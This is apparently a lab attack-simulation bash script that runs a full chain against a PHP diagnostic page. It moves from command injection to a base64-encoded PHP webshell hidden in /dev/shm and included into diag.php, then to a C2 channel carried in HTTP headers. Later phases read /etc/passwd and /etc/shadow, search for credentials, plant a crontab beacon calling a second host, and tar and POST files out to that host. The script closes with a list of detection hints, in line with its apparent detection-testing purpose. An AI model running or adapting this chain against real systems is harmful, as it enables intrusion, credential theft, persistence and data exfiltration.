#!/bin/bash
# ============================================================
# Command Injection → Memory WebShell → Persistence (Direct IP)
# (命令注入 → 内存马植入 → 持久化 攻击链 — 直连 IP 版)
#
# WARNING: Lab-only attack simulation script.
#          Do NOT run against unauthorized targets.
#
# Covered scenarios: S5 (multi-stage host anomaly), S1 (C2 communication)
# Targets: 91 (Web /cmdi/) → 92 (C2 listener :8443)
# WAF: network-layer / cloud (not host-simulated)
# C2: Memory WebShell — payload in /dev/shm/ (tmpfs), commands via HTTP headers
# Usage: bash attack.sh [WEB_IP] [WEB_PORT]
# ============================================================

set +e

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/lab-safety.sh"

# ---------- 配置 ----------
WEB_IP="${1:-10.66.6.91}"
WEB_PORT="${2:-80}"
WEB_URL="http://${WEB_IP}:${WEB_PORT}"

DROP_IP="10.66.6.92"
DROP_PORT="8443"

P="/cmdi"
MEM_TOKEN="c2token2024"
MEM_SESS=".sess_$(head -c 6 /dev/urandom | xxd -p)"

lab_require_attack_target "${WEB_IP}" || exit $?
lab_require_attack_target "${DROP_IP}" || exit $?

HTTP()  { curl -s -o /dev/null -w '%{http_code}' "$@"; }

INJECT() {
    local cmd="$1"
    curl -s "${WEB_URL}${P}/diag.php?tool=ping&host=127.0.0.1;${cmd}"
}
FILTER() { grep -v "PING\|bytes\|---\|rtt\|packets\|^$"; }

# 内存马 C2 通道: 命令通过 HTTP 请求头传递，响应嵌入 HTML 注释
MEM_CMD() {
    local cmd="$1"
    local encoded=$(echo -n "$cmd" | base64 -w0)
    local resp=$(curl -s \
        -H "X-Forwarded-Port: ${MEM_TOKEN}|${encoded}" \
        -H "X-Real-IP: body" \
        "${WEB_URL}${P}/diag.php?tool=ping&host=127.0.0.1")
    echo "$resp" | sed -n 's/.*<!--MEM:\([A-Za-z0-9+/=]*\):MEM-->.*/\1/p' | base64 -d
}

log()  { echo -e "\033[1;34m[*]\033[0m $*"; }
ok()   { echo -e "\033[1;32m[+]\033[0m $*"; }
fail() { echo -e "\033[1;31m[-]\033[0m $*"; }
hdr()  { echo -e "\n\033[1;33m========== $* ==========\033[0m"; }

# ---------- PHASE 1: 正常业务流量 ----------
phase1_normal_traffic() {
    hdr "PHASE 1: 正常业务流量"

    local -a UAS=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
        "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
    )

    HTTP -H "User-Agent: ${UAS[0]}" "${WEB_URL}${P}/"
    HTTP -H "User-Agent: ${UAS[1]}" "${WEB_URL}${P}/"
    curl -s -H "User-Agent: ${UAS[0]}" \
        "${WEB_URL}${P}/diag.php?tool=ping&host=127.0.0.1" > /dev/null
    curl -s -H "User-Agent: ${UAS[1]}" \
        "${WEB_URL}${P}/diag.php?tool=nslookup&host=www.example.com" > /dev/null
    curl -s -H "User-Agent: ${UAS[2]}" \
        "${WEB_URL}${P}/diag.php?tool=ping&host=${DROP_IP}" > /dev/null
    HTTP "${WEB_URL}/favicon.ico"

    ok "正常流量注入完成 (6 请求)"
}

# ---------- PHASE 2: 目标侦察 ----------
phase2_recon() {
    hdr "PHASE 2: 目标侦察"

    log "应用指纹识别"
    curl -sI "${WEB_URL}${P}/" 2>/dev/null | grep -iE "^(Server|X-Powered-By):" | head -3
    ok "服务器指纹已获取"

    log "页面结构探测 — 枚举入口点"
    local page
    page=$(curl -s "${WEB_URL}${P}/")
    echo "$page" | grep -oE '(href|action|name)="[^"]*"' | sort -u | head -10
    ok "页面入口点已枚举"

    log "diag.php 参数行为探测"
    HTTP "${WEB_URL}${P}/diag.php"
    HTTP "${WEB_URL}${P}/diag.php?tool=ping"
    HTTP "${WEB_URL}${P}/diag.php?tool=ping&host="
    HTTP "${WEB_URL}${P}/diag.php?tool=traceroute&host=127.0.0.1"
    ok "参数行为确认"

    log "目录枚举"
    local -a paths=(/cmdi/config/ /cmdi/admin/ /cmdi/api/ /cmdi/backup/
                     /cmdi/.env /cmdi/config.php)
    for path in "${paths[@]}"; do
        HTTP "${WEB_URL}${path}"
    done
    ok "目录枚举完成"
}

# ---------- PHASE 3: 命令注入探测 ----------
phase3_cmdi_probe() {
    hdr "PHASE 3: 命令注入探测"

    log "Step 1: 分号注入 — ;id"
    local result
    result=$(INJECT "id")
    if echo "$result" | grep -q "uid="; then
        ok "命令注入成功: $(echo "$result" | grep 'uid=' | head -1 | FILTER)"
    else
        fail "命令注入失败"; return 1
    fi
    sleep 0.5

    log "Step 2: 执行确认 — whoami"
    INJECT "whoami" | FILTER | head -1
    sleep 0.3

    log "Step 3: 系统信息收集"
    INJECT "uname+-a" | FILTER | head -1
    INJECT "cat+/etc/os-release+|+head+-3" | FILTER

    ok "命令注入探测完成"
}

# ---------- PHASE 4: 内存马植入 ----------
phase4_memshell_inject() {
    hdr "PHASE 4: 内存马植入"

    log "Step 1: 生成内存马载荷"
    local MEMSHELL_PHP
    MEMSHELL_PHP='<?php
if(isset($_SERVER["HTTP_X_FORWARDED_PORT"])){
  $p=explode("|",$_SERVER["HTTP_X_FORWARDED_PORT"]);
  if(count($p)===2 && $p[0]==="'"${MEM_TOKEN}"'"){
    $c=base64_decode($p[1]);
    $o=shell_exec($c." 2>&1");
    if(isset($_SERVER["HTTP_X_REAL_IP"]) && $_SERVER["HTTP_X_REAL_IP"]==="body"){
      echo "<!--MEM:".base64_encode($o).":MEM-->";
    }
  }
}
?>'
    local B64_SHELL=$(echo -n "$MEMSHELL_PHP" | base64 -w0)

    log "Step 2: 写入 /dev/shm/${MEM_SESS} (tmpfs 内存文件系统)"
    INJECT "echo+${B64_SHELL}+|+base64+-d+>+/dev/shm/${MEM_SESS}" > /dev/null
    local check
    check=$(INJECT "ls+-la+/dev/shm/${MEM_SESS}" | FILTER)
    if echo "$check" | grep -q "${MEM_SESS}"; then
        ok "内存马载荷已写入 /dev/shm/${MEM_SESS}"
    else
        fail "内存马写入失败"; return 1
    fi

    log "Step 3: 生成注入脚本"
    local INJECT_PY
    INJECT_PY="import sys
path = sys.argv[1]
with open(path) as fh:
    lines = fh.readlines()
lines.insert(1, '@include(\"/dev/shm/${MEM_SESS}\");\n')
with open(path, 'w') as fh:
    fh.writelines(lines)
print('INJECTED: ' + path)"
    local B64_INJPY=$(echo -n "$INJECT_PY" | base64 -w0)
    INJECT "echo+${B64_INJPY}+|+base64+-d+>+/dev/shm/.inject.py" > /dev/null

    log "Step 4: 注入 @include 到 diag.php"
    INJECT "python3+/dev/shm/.inject.py+/var/www/html/cmdi/diag.php" | FILTER

    log "Step 5: 验证内存马 C2 通道"
    local mem_result
    mem_result=$(MEM_CMD "echo MEMSHELL_ACTIVE")
    if echo "$mem_result" | grep -q "MEMSHELL_ACTIVE"; then
        ok "内存马 C2 通道已建立"
        ok "特征: 载荷在 /dev/shm/ (不落盘), 命令通过 HTTP 请求头传递"
        ok "通信: C2 流量混入正常 Web 流量 (80端口)"
    else
        fail "内存马验证失败"
    fi

    log "Step 6: 清理注入脚本"
    INJECT "rm+-f+/dev/shm/.inject.py" > /dev/null

    ok "内存马植入完成"
}

# ---------- PHASE 5: 信息收集 (通过内存马) ----------
phase5_recon_via_memshell() {
    hdr "PHASE 5: 信息收集 (通过内存马 C2)"

    log "主机名与 IP"
    MEM_CMD "hostname"
    MEM_CMD "/sbin/ip addr | grep 'inet '"

    log "进程列表"
    MEM_CMD "ps aux --sort=-%cpu | head -8"

    log "/etc/passwd"
    MEM_CMD "cat /etc/passwd" | head -5

    log "网络连接"
    MEM_CMD "ss -tlnp | head -10"

    ok "信息收集完成"
}

# ---------- PHASE 6: 凭证发现 (通过内存马) ----------
phase6_cred_discovery() {
    hdr "PHASE 6: 凭证搜索 (通过内存马)"

    log "搜索配置文件"
    MEM_CMD "find /var/www/html/cmdi -name '*.conf' -o -name '*.yml' -o -name '*.env' 2>/dev/null"

    log "读取应用配置"
    MEM_CMD "cat /var/www/html/cmdi/config/app.conf"

    log "搜索密码关键词"
    MEM_CMD "grep -r password /var/www/html/cmdi/config/ 2>/dev/null"

    ok "凭证发现完成"
}

# ---------- PHASE 7: 提权尝试 (通过内存马) ----------
phase7_privesc() {
    hdr "PHASE 7: 提权尝试 (通过内存马)"

    log "sudo 检查"
    MEM_CMD "sudo -l 2>&1" | head -5

    log "SUID 搜索"
    MEM_CMD "find /usr/bin -perm -4000 -type f 2>/dev/null"

    log "读取 /etc/shadow"
    MEM_CMD "cat /etc/shadow 2>&1" | head -3

    ok "提权尝试完成"
}

# ---------- PHASE 8: 持久化 (通过内存马) ----------
phase8_persistence() {
    hdr "PHASE 8: 持久化 (crontab beacon — 通过内存马)"

    log "写入 crontab beacon"
    # Preserve any existing web-user crontab and mark only the lab entry so the
    # scoped teardown can remove it without touching unrelated jobs.
    MEM_CMD "bash -c '(crontab -l 2>/dev/null; echo \"*/5 * * * * curl -s http://${DROP_IP}:${DROP_PORT}/beacon?h=\$(hostname) # secweaver-attack-lab\") | crontab - 2>&1'"

    log "验证 crontab"
    MEM_CMD "crontab -l 2>&1"

    ok "持久化完成"
}

# ---------- PHASE 9: 数据打包外传 (通过内存马) ----------
phase9_exfiltrate() {
    hdr "PHASE 9: 数据打包外传 (通过内存马 → 数据收集点)"

    log "打包敏感文件"
    MEM_CMD "bash -c 'tar czf /tmp/.loot.tar.gz /var/www/html/cmdi/config/ /etc/passwd 2>/dev/null && echo TAR_OK'"

    MEM_CMD "ls -la /tmp/.loot.tar.gz"

    log "通过内存马发起 POST 外传到数据收集点"
    MEM_CMD "curl -s -X POST --data-binary @/tmp/.loot.tar.gz http://${DROP_IP}:${DROP_PORT}/upload"

    log "清理临时文件"
    MEM_CMD "rm -f /tmp/.loot.tar.gz"

    ok "数据外传完成"
}

# ---------- PHASE 10: 攻击后正常流量 ----------
phase10_post_normal() {
    hdr "PHASE 10: 攻击后正常流量"

    HTTP -H "User-Agent: Mozilla/5.0 Chrome/126.0" "${WEB_URL}${P}/"
    curl -s -H "User-Agent: Mozilla/5.0 Chrome/126.0" \
        "${WEB_URL}${P}/diag.php?tool=ping&host=www.baidu.com" > /dev/null
    HTTP -H "User-Agent: Mozilla/5.0 Firefox/128.0" "${WEB_URL}${P}/"
    HTTP "${WEB_URL}/favicon.ico"

    ok "正常流量注入完成"
}

# ---------- 主流程 ----------
main() {
    echo ""
    echo "  ╔══════════════════════════════════════════════════════════╗"
    echo "  ║  命令注入 → 内存马植入 → 持久化 攻击链                     ║"
    echo "  ║  内存马: /dev/shm/ (tmpfs) + @include 注入               ║"
    echo "  ║  C2 通道: HTTP 请求头 (80端口混入正常流量)                  ║"
    echo "  ╚══════════════════════════════════════════════════════════╝"
    echo ""

    hdr "连接检查"
    local code
    code=$(HTTP "${WEB_URL}${P}/")
    if [ "$code" = "200" ]; then
        ok "Web 靶机可达 (HTTP $code)"
    else
        fail "Web 靶机不可达 ($code)"; exit 1
    fi

    local start_time=$SECONDS

    phase1_normal_traffic
    phase2_recon
    phase3_cmdi_probe
    phase4_memshell_inject
    phase5_recon_via_memshell
    phase6_cred_discovery
    phase7_privesc
    phase8_persistence
    phase9_exfiltrate
    phase10_post_normal

    local elapsed=$(( SECONDS - start_time ))

    echo ""
    hdr "攻击链执行完毕"
    ok "耗时: ${elapsed}s"
    ok "攻击路径:"
    ok "  正常流量 → 侦察 → 命令注入探测(;id)"
    ok "  → 内存马植入(/dev/shm/ + @include)"
    ok "  → 信息收集(via 内存马) → 凭证发现(via 内存马)"
    ok "  → 提权尝试 → crontab持久化 → 数据外传(via 内存马)"
    echo ""
    echo "  内存马检测要点:"
    echo "    /dev/shm/ 存在可疑 PHP 文件"
    echo "    合法 PHP 文件被注入 @include 行"
    echo "    HTTP 流量中 X-Forwarded-Port 头含异常 base64 内容"
    echo "    所有 C2 命令执行在 nginx 用户下，父进程为 php-fpm"
    echo ""
}

main "$@"
